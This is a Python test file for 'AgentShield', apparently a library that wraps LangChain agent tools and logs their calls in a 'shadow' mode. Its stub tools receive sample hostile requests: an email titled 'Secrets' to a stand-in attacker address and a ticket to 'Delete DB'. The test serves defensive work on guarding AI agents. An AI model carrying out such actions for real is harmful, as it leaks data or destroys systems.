from langchain_core.tools import tool

from agentshield import AgentShield


@tool
def send_email(to: str, subject: str, body: str) -> str:
    """Send an email."""
    return f"Email sent to {to}"


@tool
def create_ticket(title: str, priority: str) -> str:
    """Create a Jira ticket."""
    return f"Ticket created: {title}"


def test_shield() -> None:
    shield = AgentShield(mode="shadow")
    protected = shield.protect([send_email, create_ticket])
    result1 = protected[0].invoke(
        {"to": "hacker@evil.com", "subject": "Secrets", "body": "data"}
    )
    result2 = protected[1].invoke({"title": "Delete DB", "priority": "critical"})
    print(f"Email: {result1}")
    print(f"Ticket: {result2}")
    print(f"Shadow Report: {shield.get_shadow_report()}")
    assert "shadow" in result1.lower()
    assert shield.get_shadow_report()["total_actions"] == 2
    print("test_langchain passed!")


if __name__ == "__main__":
    test_shield()
